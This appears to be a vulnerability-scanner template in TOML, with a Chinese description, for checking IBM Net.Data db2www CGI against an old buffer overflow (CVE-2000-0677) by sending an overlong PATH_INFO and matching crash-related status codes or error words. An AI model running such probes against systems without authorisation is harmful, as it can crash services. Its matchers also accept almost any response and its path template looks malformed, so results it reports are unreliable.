[info]
author = "ave"
description = "通过向 IBM Net.Data db2www CGI 程序发送超长 PATH_INFO 环境变量，触发缓冲区溢出，验证目标是否存在该漏洞。发送大量字符作为 PATH_INFO 值，观察服务器响应状态码或返回内容判断漏洞存在。"
id = "POC-AVE-2000-1408"
name = "IBM Net.Data db2www CGI 缓冲区溢出远程代码执行漏洞 PoC"
severity = "critical"
tags = ["ave-2000-1408"]
vuln_id = [
    "CVE-2000-0677",
    "AVE-2000-1408",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/db2www/{{path_info}}"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    200,
    403,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "segmentation",
    "buffer overflow",
    "core dumped",
    "internal error",
]
